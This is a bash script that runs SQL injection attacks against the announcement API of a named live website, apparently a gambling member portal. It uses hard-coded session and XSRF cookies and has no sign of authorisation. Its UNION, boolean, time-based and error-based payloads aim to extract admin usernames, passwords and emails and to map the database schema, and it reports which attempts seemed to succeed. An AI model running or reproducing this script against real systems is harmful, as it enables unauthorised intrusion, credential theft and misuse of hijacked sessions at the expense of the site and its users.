#!/bin/bash

echo "🎯 FOCUSED ANNOUNCEMENT ENDPOINT EXTRACTION"
echo "============================================"

# Use the provided cookies
XSRF_TOKEN="eyJpdiI6ImU0Y2VHY2t4TEFmR25zMzI2SmlnM0E9PSIsInZhbHVlIjoieDRHSWNFSDhYM0xHb29wMmMwXC9HRmlScWpuOTBwT2ZoeVRsN2tRb0NvZ2ROcWFFc2h5aVJnU0JLWmhUWFRcL2R0IiwibWFjIjoiZjdmYmQxMmFkODFiNmY0MzNlN2I0NWQzYmZmOGE4MzY4MWQ4ZDA5OTQyNGVkMWIwZmM0NTc1ODU2YTZhM2VhMyJ9"
SESSION_TOKEN="eyJpdiI6IlMrRndEZWE0MWNzcU9VUGFaKzJLTlE9PSIsInZhbHVlIjoiYXRZZ081emlyOERHTFkxV0Z2VnNEUGEyQWh2MDRySHR0RzR4dzFGWVZnV3FvblhsMmhKcGw3Zk9PTUpKNXVnVyIsIm1hYyI6IjJkODY2NjViMTNjMzA4OTc4YTZlNmIwNjRkMGFiMGI5MTE3NDVkOGM2NmVkYjY1N2I0NzNhYjg5NmM0NWFiYmMifQ%3D%3D"

BASE_URL="https://member.panama8888b.co"
ANNOUNCEMENT_URL="$BASE_URL/api/announcement"

echo "🔍 Phase 1: Testing /api/announcement with Various Payloads"
echo "=========================================================="

# Test different SQL injection payloads on the announcement endpoint
PAYLOADS=(
    "1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "1' UNION SELECT username,password,email FROM users WHERE role='admin' LIMIT 1--"
    "1' UNION SELECT username,password,email FROM users WHERE role='admin' LIMIT 1 OFFSET 0--"
    "1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0--"
    "1' AND (SELECT username FROM users WHERE role='admin' LIMIT 1) LIKE '%admin%'--"
    "1' AND (SELECT password FROM users WHERE role='admin' LIMIT 1) IS NOT NULL--"
    "1' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema='public'--"
    "1' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name='users'--"
)

for i in "${!PAYLOADS[@]}"; do
    payload="${PAYLOADS[$i]}"
    echo "📊 Testing Payload $((i+1)): $payload"
    
    # Test with POST method
    response=$(curl -s -w "%{http_code}" -o /tmp/announcement_response_$i.txt \
      -X POST "$ANNOUNCEMENT_URL" \
      -H "Content-Type: application/json" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "{\"id\":\"$payload\"}")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/announcement_response_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 2: Testing GET Method on Announcement"
echo "=============================================="

# Test GET method with parameters
GET_PAYLOADS=(
    "?id=1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "?announcement_id=1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "?user_id=1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
)

for i in "${!GET_PAYLOADS[@]}"; do
    payload="${GET_PAYLOADS[$i]}"
    echo "📊 Testing GET Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/announcement_get_$i.txt \
      -X GET "$ANNOUNCEMENT_URL$payload" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/announcement_get_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 3: Testing Time-based Injection"
echo "========================================"

# Test time-based injection
echo "📊 Testing Time-based Injection on Announcement..."
time_test=$(curl -s -w "%{time_total}" -o /tmp/announcement_time.txt \
  -X POST "$ANNOUNCEMENT_URL" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "{\"id\":\"1' AND (SELECT SLEEP(3) FROM users WHERE role='admin' LIMIT 1)--\"}")

echo "   Response Time: ${time_test}s"

echo ""
echo "🔍 Phase 4: Testing Error-based Injection"
echo "========================================="

# Test error-based injection
ERROR_PAYLOADS=(
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x)--"
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(table_name,0x3a,column_name,FLOOR(RAND(0)*2))x FROM information_schema.columns WHERE table_schema='public' GROUP BY x)x)--"
)

for i in "${!ERROR_PAYLOADS[@]}"; do
    payload="${ERROR_PAYLOADS[$i]}"
    echo "📊 Testing Error Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/announcement_error_$i.txt \
      -X POST "$ANNOUNCEMENT_URL" \
      -H "Content-Type: application/json" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "{\"id\":\"$payload\"}")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/announcement_error_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🎯 ANALYSIS RESULTS"
echo "=================="

# Check for successful responses
success_count=0
total_tests=0

# Check POST responses
for i in "${!PAYLOADS[@]}"; do
    if [ -f "/tmp/announcement_response_$i.txt" ]; then
        content=$(cat "/tmp/announcement_response_$i.txt")
        total_tests=$((total_tests + 1))
        
        if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
            success_count=$((success_count + 1))
            echo "✅ Potential success found in POST response $i"
            echo "   Content: $content"
        fi
    fi
done

# Check GET responses
for i in "${!GET_PAYLOADS[@]}"; do
    if [ -f "/tmp/announcement_get_$i.txt" ]; then
        content=$(cat "/tmp/announcement_get_$i.txt")
        total_tests=$((total_tests + 1))
        
        if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
            success_count=$((success_count + 1))
            echo "✅ Potential success found in GET response $i"
            echo "   Content: $content"
        fi
    fi
done

# Check error responses
for i in "${!ERROR_PAYLOADS[@]}"; do
    if [ -f "/tmp/announcement_error_$i.txt" ]; then
        content=$(cat "/tmp/announcement_error_$i.txt")
        total_tests=$((total_tests + 1))
        
        if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
            success_count=$((success_count + 1))
            echo "✅ Potential success found in Error response $i"
            echo "   Content: $content"
        fi
    fi
done

echo ""
echo "📊 SUCCESS RATE: $success_count/$total_tests"

if [ "$success_count" -gt 0 ]; then
    echo "🎉 POTENTIAL VULNERABILITY DETECTED!"
    echo "   Some payloads may have successfully extracted data"
else
    echo "❌ No clear vulnerabilities detected in announcement endpoint"
fi

# Clean up temp files
rm -f /tmp/announcement_response_*.txt /tmp/announcement_get_*.txt /tmp/announcement_error_*.txt /tmp/announcement_time.txt

echo ""
echo "🎯 FOCUSED ANNOUNCEMENT ENDPOINT EXTRACTION COMPLETED!"